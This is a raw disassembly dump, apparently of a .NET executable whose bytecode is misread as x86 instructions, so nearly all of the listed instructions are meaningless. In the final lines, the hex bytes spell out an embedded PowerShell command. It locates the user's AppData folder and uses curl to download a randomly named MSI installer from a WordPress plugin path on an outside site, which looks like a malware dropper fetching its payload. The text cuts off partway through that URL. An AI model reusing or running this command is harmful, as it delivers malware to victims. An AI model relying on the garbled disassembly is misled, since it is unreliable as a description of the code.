  404524:	28 36                	sub    %dh,(%esi)
  404526:	00 00                	add    %al,(%eax)
  404528:	06                   	push   %es
  404529:	2c 1c                	sub    $0x1c,%al
  40452b:	72 01                	jb     0x40452e
  40452d:	00 00                	add    %al,(%eax)
  40452f:	70 13                	jo     0x404544
  404531:	07                   	pop    %es
  404532:	2b 09                	sub    (%ecx),%ecx
  404534:	11 06                	adc    %eax,(%esi)
  404536:	11 07                	adc    %eax,(%edi)
  404538:	6f                   	outsl  %ds:(%esi),(%dx)
  404539:	f7 00 00 0a 28 f8    	testl  $0xf8280a00,(%eax)
  40453f:	00 00                	add    %al,(%eax)
  404541:	0a 25 13 07 2d ed    	or     0xed2d0713,%ah
  404547:	11 06                	adc    %eax,(%esi)
  404549:	6f                   	outsl  %ds:(%esi),(%dx)
  40454a:	f9                   	stc
  40454b:	00 00                	add    %al,(%eax)
  40454d:	0a 73 fa             	or     -0x6(%ebx),%dh
  404550:	00 00                	add    %al,(%eax)
  404552:	0a 13                	or     (%ebx),%dl
  404554:	08 11                	or     %dl,(%ecx)
  404556:	08 11                	or     %dl,(%ecx)
  404558:	17                   	pop    %ss
  404559:	2d 0f 11 19 fe       	sub    $0xfe19110f,%eax
  40455e:	06                   	push   %es
  40455f:	7c 00                	jl     0x404561
  404561:	00 06                	add    %al,(%esi)
  404563:	73 f4                	jae    0x404559
  404565:	00 00                	add    %al,(%eax)
  404567:	0a 13                	or     (%ebx),%dl
  404569:	17                   	pop    %ss
  40456a:	11 17                	adc    %edx,(%edi)
  40456c:	6f                   	outsl  %ds:(%esi),(%dx)
  40456d:	fb                   	sti
  40456e:	00 00                	add    %al,(%eax)
  404570:	0a 16                	or     (%esi),%dl
  404572:	13 09                	adc    (%ecx),%ecx
  404574:	16                   	push   %ss
  404575:	13 0a                	adc    (%edx),%ecx
  404577:	02 13                	add    (%ebx),%dl
  404579:	1b 16                	sbb    (%esi),%edx
  40457b:	13 1c 38             	adc    (%eax,%edi,1),%ebx
  40457e:	c7 00 00 00 11 1b    	movl   $0x1b110000,(%eax)
  404584:	11 1c 9a             	adc    %ebx,(%edx,%ebx,4)
  404587:	13 0b                	adc    (%ebx),%ecx
  404589:	11 0b                	adc    %ecx,(%ebx)
  40458b:	72 7b                	jb     0x404608
  40458d:	02 00                	add    (%eax),%al
  40458f:	70 17                	jo     0x4045a8
  404591:	28 fc                	sub    %bh,%ah
  404593:	00 00                	add    %al,(%eax)
  404595:	0a 2d 07 17 0b 38    	or     0x380b1707,%ch
  40459b:	9e                   	sahf
  40459c:	00 00                	add    %al,(%eax)
  40459e:	00 11                	add    %dl,(%ecx)
  4045a0:	0b 72 87             	or     -0x79(%edx),%esi
  4045a3:	02 00                	add    (%eax),%al
  4045a5:	70 19                	jo     0x4045c0
  4045a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a8:	fd                   	std
  4045a9:	00 00                	add    %al,(%eax)
  4045ab:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  4045ae:	11 0b                	adc    %ecx,(%ebx)
  4045b0:	17                   	pop    %ss
  4045b1:	8d 35 00 00 01 13    	lea    0x13010000,%esi
  4045b7:	1d 11 1d 16 72       	sbb    $0x72161d11,%eax
  4045bc:	99                   	cltd
  4045bd:	02 00                	add    (%eax),%al
  4045bf:	70 a2                	jo     0x404563
  4045c1:	11 1d 18 17 6f fe    	adc    %ebx,0xfe6f1718
  4045c7:	00 00                	add    %al,(%eax)
  4045c9:	0a 13                	or     (%ebx),%dl
  4045cb:	0c 11                	or     $0x11,%al
  4045cd:	0c 8e                	or     $0x8e,%al
  4045cf:	69 18 2e 20 72 9d    	imul   $0x9d72202e,(%eax),%ebx
  4045d5:	02 00                	add    (%eax),%al
  4045d7:	70 28                	jo     0x404601
  4045d9:	29 00                	sub    %eax,(%eax)
  4045db:	00 0a                	add    %cl,(%edx)
  4045dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4045de:	2a 00                	sub    (%eax),%al
  4045e0:	00 0a                	add    %cl,(%edx)
  4045e2:	16                   	push   %ss
  4045e3:	1f                   	pop    %ds
  4045e4:	10 28                	adc    %ch,(%eax)
  4045e6:	ff 00                	incl   (%eax)
  4045e8:	00 0a                	add    %cl,(%edx)
  4045ea:	26 17                	es pop %ss
  4045ec:	13 1a                	adc    (%edx),%ebx
  4045ee:	dd 78 03             	fnstsw 0x3(%eax)
  4045f1:	00 00                	add    %al,(%eax)
  4045f3:	11 0c 17             	adc    %ecx,(%edi,%edx,1)
  4045f6:	9a 17 8d 64 00 00 01 	lcall  $0x100,$0x648d17
  4045fd:	13 1e                	adc    (%esi),%ebx
  4045ff:	11 1e                	adc    %ebx,(%esi)
  404601:	16                   	push   %ss
  404602:	1f                   	pop    %ds
  404603:	22 9d 11 1e 6f 00    	and    0x6f1e11(%ebp),%bl
  404609:	01 00                	add    %eax,(%eax)
  40460b:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40460e:	2e 11 0b             	adc    %ecx,%cs:(%ebx)
  404611:	72 7c                	jb     0x40468f
  404613:	03 00                	add    (%eax),%eax
  404615:	70 17                	jo     0x40462e
  404617:	28 fc                	sub    %bh,%ah
  404619:	00 00                	add    %al,(%eax)
  40461b:	0a 2d 08 11 0a 17    	or     0x170a1108,%ch
  404621:	58                   	pop    %eax
  404622:	13 09                	adc    (%ecx),%ecx
  404624:	2b 2e                	sub    (%esi),%ebp
  404626:	11 0b                	adc    %ecx,(%ebx)
  404628:	72 86                	jb     0x4045b0
  40462a:	03 00                	add    (%eax),%eax
  40462c:	70 17                	jo     0x404645
  40462e:	28 fc                	sub    %bh,%ah
  404630:	00 00                	add    %al,(%eax)
  404632:	0a 2d 08 28 01 01    	or     0x1012808,%ch
  404638:	00 0a                	add    %cl,(%edx)
  40463a:	26 2b 17             	sub    %es:(%edi),%edx
  40463d:	11 0a                	adc    %ecx,(%edx)
  40463f:	17                   	pop    %ss
  404640:	58                   	pop    %eax
  404641:	13 0a                	adc    (%edx),%ecx
  404643:	11 1c 17             	adc    %ebx,(%edi,%edx,1)
  404646:	58                   	pop    %eax
  404647:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  40464a:	1c 11                	sbb    $0x11,%al
  40464c:	1b 8e 69 3f 2e ff    	sbb    -0xd1c097(%esi),%ecx
  404652:	ff                   	(bad)
  404653:	ff 28                	ljmp   *(%eax)
  404655:	48                   	dec    %eax
  404656:	00 00                	add    %al,(%eax)
  404658:	0a 13                	or     (%ebx),%dl
  40465a:	0d 11 0d 72 94       	or     $0x94720d11,%eax
  40465f:	03 00                	add    (%eax),%eax
  404661:	70 6f                	jo     0x4046d2
  404663:	02 01                	add    (%ecx),%al
  404665:	00 0a                	add    %cl,(%edx)
  404667:	13 0e                	adc    (%esi),%ecx
  404669:	11 0e                	adc    %ecx,(%esi)
  40466b:	28 03                	sub    %al,(%ebx)
  40466d:	01 00                	add    %eax,(%eax)
  40466f:	0a 73 04             	or     0x4(%ebx),%dh
  404672:	01 00                	add    %eax,(%eax)
  404674:	0a 13                	or     (%ebx),%dl
  404676:	0f 11 0f             	movups %xmm1,(%edi)
  404679:	6f                   	outsl  %ds:(%esi),(%dx)
  40467a:	05 01 00 0a 13       	add    $0x130a0001,%eax
  40467f:	10 08                	adc    %cl,(%eax)
  404681:	28 0f                	sub    %cl,(%edi)
  404683:	00 00                	add    %al,(%eax)
  404685:	0a 2d 10 08 11 10    	or     0x10110810,%ch
  40468b:	28 06                	sub    %al,(%esi)
  40468d:	01 00                	add    %eax,(%eax)
  40468f:	0a 16                	or     (%esi),%dl
  404691:	13 1a                	adc    (%edx),%ebx
  404693:	dd d3                	fst    %st(3)
  404695:	02 00                	add    (%eax),%al
  404697:	00 11                	add    %dl,(%ecx)
  404699:	05 11 10 6f 07       	add    $0x76f1011,%eax
  40469e:	01 00                	add    %eax,(%eax)
  4046a0:	0a 26                	or     (%esi),%ah
  4046a2:	de 0c 11             	fimuls (%ecx,%edx,1)
  4046a5:	0f 2c 07             	cvttps2pi (%edi),%mm0
  4046a8:	11 0f                	adc    %ecx,(%edi)
  4046aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ab:	60                   	pusha
  4046ac:	00 00                	add    %al,(%eax)
  4046ae:	0a dc                	or     %ah,%bl
  4046b0:	de 0c 11             	fimuls (%ecx,%edx,1)
  4046b3:	0e                   	push   %cs
  4046b4:	2c 07                	sub    $0x7,%al
  4046b6:	11 0e                	adc    %ecx,(%esi)
  4046b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b9:	60                   	pusha
  4046ba:	00 00                	add    %al,(%eax)
  4046bc:	0a dc                	or     %ah,%bl
  4046be:	14 13                	adc    $0x13,%al
  4046c0:	11 72 ac             	adc    %esi,-0x54(%edx)
  4046c3:	03 00                	add    (%eax),%eax
  4046c5:	70 73                	jo     0x40473a
  4046c7:	08 01                	or     %al,(%ecx)
  4046c9:	00 0a                	add    %cl,(%edx)
  4046cb:	13 12                	adc    (%edx),%edx
  4046cd:	11 09                	adc    %ecx,(%ecx)
  4046cf:	13 13                	adc    (%ebx),%edx
  4046d1:	38 ae 01 00 00 11    	cmp    %ch,0x11000001(%esi)
  4046d7:	12 02                	adc    (%edx),%al
  4046d9:	11 13                	adc    %edx,(%ebx)
  4046db:	9a 6f 09 01 00 0a 13 	lcall  $0x130a,$0x1096f
  4046e2:	14 11                	adc    $0x11,%al
  4046e4:	14 6f                	adc    $0x6f,%al
  4046e6:	0a 01                	or     (%ecx),%al
  4046e8:	00 0a                	add    %cl,(%edx)
  4046ea:	39 6c 01 00          	cmp    %ebp,0x0(%ecx,%eax,1)
  4046ee:	00 11                	add    %dl,(%ecx)
  4046f0:	14 6f                	adc    $0x6f,%al
  4046f2:	0b 01                	or     (%ecx),%eax
  4046f4:	00 0a                	add    %cl,(%edx)
  4046f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4046f7:	0c 01                	or     $0x1,%al
  4046f9:	00 0a                	add    %cl,(%edx)
  4046fb:	19 40 5a             	sbb    %eax,0x5a(%eax)
  4046fe:	01 00                	add    %eax,(%eax)
  404700:	00 02                	add    %al,(%edx)
  404702:	11 13                	adc    %edx,(%ebx)
  404704:	9a 12 15 28 0d 01 00 	lcall  $0x1,$0xd281512
  40470b:	0a 3a                	or     (%edx),%bh
  40470d:	4a                   	dec    %edx
  40470e:	01 00                	add    %eax,(%eax)
  404710:	00 11                	add    %dl,(%ecx)
  404712:	11 2c 0a             	adc    %ebp,(%edx,%ecx,1)
  404715:	11 05 11 11 6f 0e    	adc    %eax,0xe6f1111
  40471b:	01 00                	add    %eax,(%eax)
  40471d:	0a 26                	or     (%esi),%ah
  40471f:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  404722:	0b 01                	or     (%ecx),%eax
  404724:	00 0a                	add    %cl,(%edx)
  404726:	18 6f 0f             	sbb    %ch,0xf(%edi)
  404729:	01 00                	add    %eax,(%eax)
  40472b:	0a 6f 10             	or     0x10(%edi),%ch
  40472e:	01 00                	add    %eax,(%eax)
  404730:	0a 6f 11             	or     0x11(%edi),%ch
  404733:	01 00                	add    %eax,(%eax)
  404735:	0a 72 01             	or     0x1(%edx),%dh
  404738:	00 00                	add    %al,(%eax)
  40473a:	70 28                	jo     0x404764
  40473c:	c5 00                	lds    (%eax),%eax
  40473e:	00 0a                	add    %cl,(%edx)
  404740:	2c 19                	sub    $0x19,%al
  404742:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  404745:	0b 01                	or     (%ecx),%eax
  404747:	00 0a                	add    %cl,(%edx)
  404749:	17                   	pop    %ss
  40474a:	6f                   	outsl  %ds:(%esi),(%dx)
  40474b:	0f 01 00             	sgdtl  (%eax)
  40474e:	0a 6f 10             	or     0x10(%edi),%ch
  404751:	01 00                	add    %eax,(%eax)
  404753:	0a 13                	or     (%ebx),%dl
  404755:	11 38                	adc    %edi,(%eax)
  404757:	23 01                	and    (%ecx),%eax
  404759:	00 00                	add    %al,(%eax)
  40475b:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  40475e:	0b 01                	or     (%ecx),%eax
  404760:	00 0a                	add    %cl,(%edx)
  404762:	18 6f 0f             	sbb    %ch,0xf(%edi)
  404765:	01 00                	add    %eax,(%eax)
  404767:	0a 6f 10             	or     0x10(%edi),%ch
  40476a:	01 00                	add    %eax,(%eax)
  40476c:	0a 72 dc             	or     -0x24(%edx),%dh
  40476f:	03 00                	add    (%eax),%eax
  404771:	70 28                	jo     0x40479b
  404773:	c5 00                	lds    (%eax),%eax
  404775:	00 0a                	add    %cl,(%edx)
  404777:	2d 23 11 14 6f       	sub    $0x6f141123,%eax
  40477c:	0b 01                	or     (%ecx),%eax
  40477e:	00 0a                	add    %cl,(%edx)
  404780:	18 6f 0f             	sbb    %ch,0xf(%edi)
  404783:	01 00                	add    %eax,(%eax)
  404785:	0a 6f 10             	or     0x10(%edi),%ch
  404788:	01 00                	add    %eax,(%eax)
  40478a:	0a 6f 12             	or     0x12(%edi),%ch
  40478d:	01 00                	add    %eax,(%eax)
  40478f:	0a 72 e6             	or     -0x1a(%edx),%dh
  404792:	03 00                	add    (%eax),%eax
  404794:	70 28                	jo     0x4047be
  404796:	c5 00                	lds    (%eax),%eax
  404798:	00 0a                	add    %cl,(%edx)
  40479a:	2c 28                	sub    $0x28,%al
  40479c:	11 05 11 14 6f 0b    	adc    %eax,0xb6f1411
  4047a2:	01 00                	add    %eax,(%eax)
  4047a4:	0a 17                	or     (%edi),%dl
  4047a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a7:	0f 01 00             	sgdtl  (%eax)
  4047aa:	0a 6f 10             	or     0x10(%edi),%ch
  4047ad:	01 00                	add    %eax,(%eax)
  4047af:	0a 17                	or     (%edi),%dl
  4047b1:	8c 8f 00 00 01 6f    	mov    %cs,0x6f010000(%edi)
  4047b7:	13 01                	adc    (%ecx),%eax
  4047b9:	00 0a                	add    %cl,(%edx)
  4047bb:	26 14 13             	es adc $0x13,%al
  4047be:	11 38                	adc    %edi,(%eax)
  4047c0:	ba 00 00 00 11       	mov    $0x11000000,%edx
  4047c5:	14 6f                	adc    $0x6f,%al
  4047c7:	0b 01                	or     (%ecx),%eax
  4047c9:	00 0a                	add    %cl,(%edx)
  4047cb:	18 6f 0f             	sbb    %ch,0xf(%edi)
  4047ce:	01 00                	add    %eax,(%eax)
  4047d0:	0a 6f 10             	or     0x10(%edi),%ch
  4047d3:	01 00                	add    %eax,(%eax)
  4047d5:	0a 72 f2             	or     -0xe(%edx),%dh
  4047d8:	03 00                	add    (%eax),%eax
  4047da:	70 28                	jo     0x404804
  4047dc:	c5 00                	lds    (%eax),%eax
  4047de:	00 0a                	add    %cl,(%edx)
  4047e0:	2d 23 11 14 6f       	sub    $0x6f141123,%eax
  4047e5:	0b 01                	or     (%ecx),%eax
  4047e7:	00 0a                	add    %cl,(%edx)
  4047e9:	18 6f 0f             	sbb    %ch,0xf(%edi)
  4047ec:	01 00                	add    %eax,(%eax)
  4047ee:	0a 6f 10             	or     0x10(%edi),%ch
  4047f1:	01 00                	add    %eax,(%eax)
  4047f3:	0a 6f 12             	or     0x12(%edi),%ch
  4047f6:	01 00                	add    %eax,(%eax)
  4047f8:	0a 72 fe             	or     -0x2(%edx),%dh
  4047fb:	03 00                	add    (%eax),%eax
  4047fd:	70 28                	jo     0x404827
  4047ff:	c5 00                	lds    (%eax),%eax
  404801:	00 0a                	add    %cl,(%edx)
  404803:	2c 25                	sub    $0x25,%al
  404805:	11 05 11 14 6f 0b    	adc    %eax,0xb6f1411
  40480b:	01 00                	add    %eax,(%eax)
  40480d:	0a 17                	or     (%edi),%dl
  40480f:	6f                   	outsl  %ds:(%esi),(%dx)
  404810:	0f 01 00             	sgdtl  (%eax)
  404813:	0a 6f 10             	or     0x10(%edi),%ch
  404816:	01 00                	add    %eax,(%eax)
  404818:	0a 16                	or     (%esi),%dl
  40481a:	8c 8f 00 00 01 6f    	mov    %cs,0x6f010000(%edi)
  404820:	13 01                	adc    (%ecx),%eax
  404822:	00 0a                	add    %cl,(%edx)
  404824:	26 14 13             	es adc $0x13,%al
  404827:	11 2b                	adc    %ebp,(%ebx)
  404829:	54                   	push   %esp
  40482a:	11 05 11 14 6f 0b    	adc    %eax,0xb6f1411
  404830:	01 00                	add    %eax,(%eax)
  404832:	0a 17                	or     (%edi),%dl
  404834:	6f                   	outsl  %ds:(%esi),(%dx)
  404835:	0f 01 00             	sgdtl  (%eax)
  404838:	0a 6f 10             	or     0x10(%edi),%ch
  40483b:	01 00                	add    %eax,(%eax)
  40483d:	0a 11                	or     (%ecx),%dl
  40483f:	14 6f                	adc    $0x6f,%al
  404841:	0b 01                	or     (%ecx),%eax
  404843:	00 0a                	add    %cl,(%edx)
  404845:	18 6f 0f             	sbb    %ch,0xf(%edi)
  404848:	01 00                	add    %eax,(%eax)
  40484a:	0a 6f 10             	or     0x10(%edi),%ch
  40484d:	01 00                	add    %eax,(%eax)
  40484f:	0a 6f 13             	or     0x13(%edi),%ch
  404852:	01 00                	add    %eax,(%eax)
  404854:	0a 26                	or     (%esi),%ah
  404856:	14 13                	adc    $0x13,%al
  404858:	11 2b                	adc    %ebp,(%ebx)
  40485a:	23 11                	and    (%ecx),%edx
  40485c:	11 2c 13             	adc    %ebp,(%ebx,%edx,1)
  40485f:	11 05 11 11 02 11    	adc    %eax,0x11021111
  404865:	13 9a 6f 13 01 00    	adc    0x1136f(%edx),%ebx
  40486b:	0a 26                	or     (%esi),%ah
  40486d:	14 13                	adc    $0x13,%al
  40486f:	11 2b                	adc    %ebp,(%ebx)
  404871:	0c 11                	or     $0x11,%al
  404873:	05 02 11 13 9a       	add    $0x9a131102,%eax
  404878:	6f                   	outsl  %ds:(%esi),(%dx)
  404879:	14 01                	adc    $0x1,%al
  40487b:	00 0a                	add    %cl,(%edx)
  40487d:	26 11 13             	adc    %edx,%es:(%ebx)
  404880:	17                   	pop    %ss
  404881:	58                   	pop    %eax
  404882:	13 13                	adc    (%ebx),%edx
  404884:	11 13                	adc    %edx,(%ebx)
  404886:	02 8e 69 3f 48 fe    	add    -0x1b7c097(%esi),%cl
  40488c:	ff                   	(bad)
  40488d:	ff 11                	call   *(%ecx)
  40488f:	11 2c 0a             	adc    %ebp,(%edx,%ecx,1)
  404892:	11 05 11 11 6f 0e    	adc    %eax,0xe6f1111
  404898:	01 00                	add    %eax,(%eax)
  40489a:	0a 26                	or     (%esi),%ah
  40489c:	11 05 72 0c 04 00    	adc    %eax,0x40c72
  4048a2:	70 6f                	jo     0x404913
  4048a4:	15 01 00 0a 26       	adc    $0x260a0001,%eax
  4048a9:	11 05 72 22 04 00    	adc    %eax,0x42272
  4048af:	70 6f                	jo     0x404920
  4048b1:	0e                   	push   %cs
  4048b2:	01 00                	add    %eax,(%eax)
  4048b4:	0a 26                	or     (%esi),%ah
  4048b6:	11 05 11 06 11 08    	adc    %eax,0x8110611
  4048bc:	14 11                	adc    $0x11,%al
  4048be:	18 2d 0f 11 19 fe    	sbb    %ch,0xfe19110f
  4048c4:	06                   	push   %es
  4048c5:	7d 00                	jge    0x4048c7
  4048c7:	00 06                	add    %al,(%esi)
  4048c9:	73 16                	jae    0x4048e1
  4048cb:	01 00                	add    %eax,(%eax)
  4048cd:	0a 13                	or     (%ebx),%dl
  4048cf:	18 11                	sbb    %dl,(%ecx)
  4048d1:	18 14 6f             	sbb    %dl,(%edi,%ebp,2)
  4048d4:	02 00                	add    (%eax),%al
  4048d6:	00 2b                	add    %ch,(%ebx)
  4048d8:	26 06                	es push %es
  4048da:	6f                   	outsl  %ds:(%esi),(%dx)
  4048db:	73 00                	jae    0x4048dd
  4048dd:	00 06                	add    %al,(%esi)
  4048df:	2d 10 11 19 7b       	sub    $0x7b191110,%eax
  4048e4:	59                   	pop    %ecx
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	04 1f                	add    $0x1f,%al
  4048e9:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048eb:	18 01                	sbb    %al,(%ecx)
  4048ed:	00 0a                	add    %cl,(%edx)
  4048ef:	2c e8                	sub    $0xe8,%al
  4048f1:	11 05 6f 19 01 00    	adc    %eax,0x1196f
  4048f7:	0a 11                	or     (%ecx),%dl
  4048f9:	05 6f 1a 01 00       	add    $0x11a6f,%eax
  4048fe:	0a 6f 1b             	or     0x1b(%edi),%ch
  404901:	01 00                	add    %eax,(%eax)
  404903:	0a 1b                	or     (%ebx),%bl
  404905:	33 1d 11 19 7b 58    	xor    0x587b1911,%ebx
  40490b:	00 00                	add    %al,(%eax)
  40490d:	04 11                	add    $0x11,%al
  40490f:	05 6f 1a 01 00       	add    $0x11a6f,%eax
  404914:	0a 6f 1c             	or     0x1c(%edi),%ch
  404917:	01 00                	add    %eax,(%eax)
  404919:	0a 6f e4             	or     -0x1c(%edi),%ch
  40491c:	00 00                	add    %al,(%eax)
  40491e:	0a 6f e5             	or     -0x1b(%edi),%ch
  404921:	00 00                	add    %al,(%eax)
  404923:	0a de                	or     %dh,%bl
  404925:	0c 11                	or     $0x11,%al
  404927:	05 2c 07 11 05       	add    $0x511072c,%eax
  40492c:	6f                   	outsl  %ds:(%esi),(%dx)
  40492d:	60                   	pusha
  40492e:	00 00                	add    %al,(%eax)
  404930:	0a dc                	or     %ah,%bl
  404932:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404935:	1d 01 00 0a de       	sbb    $0xde0a0001,%eax
  40493a:	0c 11                	or     $0x11,%al
  40493c:	04 2c                	add    $0x2c,%al
  40493e:	07                   	pop    %es
  40493f:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404942:	60                   	pusha
  404943:	00 00                	add    %al,(%eax)
  404945:	0a dc                	or     %ah,%bl
  404947:	de 03                	fiadds (%ebx)
  404949:	26 de 00             	fiadds %es:(%eax)
  40494c:	07                   	pop    %es
  40494d:	2c 15                	sub    $0x15,%al
  40494f:	72 30                	jb     0x404981
  404951:	04 00                	add    $0x0,%al
  404953:	70 28                	jo     0x40497d
  404955:	29 00                	sub    %eax,(%eax)
  404957:	00 0a                	add    %cl,(%edx)
  404959:	6f                   	outsl  %ds:(%esi),(%dx)
  40495a:	2a 00                	sub    (%eax),%al
  40495c:	00 0a                	add    %cl,(%edx)
  40495e:	28 ac 00 00 0a 26 06 	sub    %ch,0x6260a00(%eax,%eax,1)
  404965:	6f                   	outsl  %ds:(%esi),(%dx)
  404966:	75 00                	jne    0x404968
  404968:	00 06                	add    %al,(%esi)
  40496a:	2a 11                	sub    (%ecx),%dl
  40496c:	1a 2a                	sbb    (%edx),%ch
  40496e:	00 00                	add    %al,(%eax)
  404970:	41                   	inc    %ecx
  404971:	7c 00                	jl     0x404973
  404973:	00 02                	add    %al,(%edx)
  404975:	00 00                	add    %al,(%eax)
  404977:	00 07                	add    %al,(%edi)
  404979:	02 00                	add    (%eax),%al
  40497b:	00 2d 00 00 00 34    	add    %ch,0x34000000
  404981:	02 00                	add    (%eax),%al
  404983:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404986:	00 00                	add    %al,(%eax)
  404988:	00 00                	add    %al,(%eax)
  40498a:	00 00                	add    %al,(%eax)
  40498c:	02 00                	add    (%eax),%al
  40498e:	00 00                	add    %al,(%eax)
  404990:	f9                   	stc
  404991:	01 00                	add    %eax,(%eax)
  404993:	00 49 00             	add    %cl,0x0(%ecx)
  404996:	00 00                	add    %al,(%eax)
  404998:	42                   	inc    %edx
  404999:	02 00                	add    (%eax),%al
  40499b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40499e:	00 00                	add    %al,(%eax)
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 00                	add    %al,(%eax)
  4049a4:	02 00                	add    (%eax),%al
  4049a6:	00 00                	add    %al,(%eax)
  4049a8:	7e 00                	jle    0x4049aa
  4049aa:	00 00                	add    %al,(%eax)
  4049ac:	38 04 00             	cmp    %al,(%eax,%eax,1)
  4049af:	00 b6 04 00 00 0c    	add    %dh,0xc000004(%esi)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	00 00                	add    %al,(%eax)
  4049b9:	00 00                	add    %al,(%eax)
  4049bb:	00 02                	add    %al,(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	00 68 00             	add    %ch,0x0(%eax)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	63 04 00             	arpl   %eax,(%eax,%eax,1)
  4049c7:	00 cb                	add    %cl,%bl
  4049c9:	04 00                	add    $0x0,%al
  4049cb:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4049d6:	00 00                	add    %al,(%eax)
  4049d8:	60                   	pusha
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	00 79 04             	add    %bh,0x4(%ecx)
  4049de:	00 00                	add    %al,(%eax)
  4049e0:	d9 04 00             	flds   (%eax,%eax,1)
  4049e3:	00 03                	add    %al,(%ebx)
  4049e5:	00 00                	add    %al,(%eax)
  4049e7:	00 6b 00             	add    %ch,0x0(%ebx)
  4049ea:	00 01                	add    %al,(%ecx)
  4049ec:	6a 72                	push   $0x72
  4049ee:	58                   	pop    %eax
  4049ef:	04 00                	add    $0x0,%al
  4049f1:	70 28                	jo     0x404a1b
  4049f3:	29 00                	sub    %eax,(%eax)
  4049f5:	00 0a                	add    %cl,(%edx)
  4049f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4049f8:	2a 00                	sub    (%eax),%al
  4049fa:	00 0a                	add    %cl,(%edx)
  4049fc:	28 a8 00 00 0a 73    	sub    %ch,0x730a0000(%eax)
  404a02:	1e                   	push   %ds
  404a03:	01 00                	add    %eax,(%eax)
  404a05:	0a 7a 1e             	or     0x1e(%edx),%bh
  404a08:	02 28                	add    (%eax),%ch
  404a0a:	13 00                	adc    (%eax),%eax
  404a0c:	00 0a                	add    %cl,(%edx)
  404a0e:	2a 00                	sub    (%eax),%al
  404a10:	dd 00                	fldl   (%eax)
  404a12:	00 00                	add    %al,(%eax)
  404a14:	24 75                	and    $0x75,%al
  404a16:	73 72                	jae    0x404a8a
  404a18:	20 3d 20 5b 45 6e    	and    %bh,0x6e455b20
  404a1e:	76 69                	jbe    0x404a89
  404a20:	72 6f                	jb     0x404a91
  404a22:	6e                   	outsb  %ds:(%esi),(%dx)
  404a23:	6d                   	insl   (%dx),%es:(%edi)
  404a24:	65 6e                	outsb  %gs:(%esi),(%dx)
  404a26:	74 5d                	je     0x404a85
  404a28:	3a 3a                	cmp    (%edx),%bh
  404a2a:	47                   	inc    %edi
  404a2b:	65 74 46             	gs je  0x404a74
  404a2e:	6f                   	outsl  %ds:(%esi),(%dx)
  404a2f:	6c                   	insb   (%dx),%es:(%edi)
  404a30:	64 65 72 50          	fs gs jb 0x404a84
  404a34:	61                   	popa
  404a35:	74 68                	je     0x404a9f
  404a37:	28 27                	sub    %ah,(%edi)
  404a39:	55                   	push   %ebp
  404a3a:	73 65                	jae    0x404aa1
  404a3c:	72 50                	jb     0x404a8e
  404a3e:	72 6f                	jb     0x404aaf
  404a40:	66 69 6c 65 27 29 3b 	imul   $0x3b29,0x27(%ebp,%eiz,2),%bp
  404a47:	20 24 66             	and    %ah,(%esi,%eiz,2)
  404a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  404a4b:	6c                   	insb   (%dx),%es:(%edi)
  404a4c:	64 65 72 20          	fs gs jb 0x404a70
  404a50:	3d 20 22 24 75       	cmp    $0x75242220,%eax
  404a55:	73 72                	jae    0x404ac9
  404a57:	5c                   	pop    %esp
  404a58:	41                   	inc    %ecx
  404a59:	70 70                	jo     0x404acb
  404a5b:	44                   	inc    %esp
  404a5c:	61                   	popa
  404a5d:	74 61                	je     0x404ac0
  404a5f:	5c                   	pop    %esp
  404a60:	4c                   	dec    %esp
  404a61:	6f                   	outsl  %ds:(%esi),(%dx)
  404a62:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  404a65:	22 3b                	and    (%ebx),%bh
  404a67:	20 20                	and    %ah,(%eax)
  404a69:	63 75 72             	arpl   %esi,0x72(%ebp)
  404a6c:	6c                   	insb   (%dx),%es:(%edi)
  404a6d:	20 2d 6f 20 22 24    	and    %ch,0x2422206f
  404a73:	66 6f                	outsw  %ds:(%esi),(%dx)
  404a75:	6c                   	insb   (%dx),%es:(%edi)
  404a76:	64 65 72 5c          	fs gs jb 0x404ad6
  404a7a:	68 78 30 7a 78       	push   $0x787a3078
  404a7f:	39 78 2e             	cmp    %edi,0x2e(%eax)
  404a82:	6d                   	insl   (%dx),%es:(%edi)
  404a83:	73 69                	jae    0x404aee
  404a85:	22 20                	and    (%eax),%ah
  404a87:	22 68 74             	and    0x74(%eax),%ch
  404a8a:	74 70                	je     0x404afc
  404a8c:	73 3a                	jae    0x404ac8
  404a8e:	2f                   	das
  404a8f:	2f                   	das
  404a90:	63 75 6f             	arpl   %esi,0x6f(%ebp)
  404a93:	72 65                	jb     0x404afa
  404a95:	67 72 61             	addr16 jb 0x404af9
  404a98:	6d                   	insl   (%dx),%es:(%edi)
  404a99:	61                   	popa
  404a9a:	64 6f                	outsl  %fs:(%esi),(%dx)
  404a9c:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  404aa0:	2e 62 72 2f          	bound  %esi,%cs:0x2f(%edx)
  404aa4:	77 70                	ja     0x404b16
  404aa6:	2d 63 6f 6e 74       	sub    $0x746e6f63,%eax
  404aab:	65 6e                	outsb  %gs:(%esi),(%dx)
  404aad:	74 2f                	je     0x404ade
  404aaf:	70 6c                	jo     0x404b1d
  404ab1:	75 67                	jne    0x404b1a
  404ab3:	69 6e 73 2f 69 6e 66 	imul   $0x666e692f,0x73(%esi),%ebp
  404aba:	6f                   	outsl  %ds:(%esi),(%dx)
  404abb:	2f                   	das
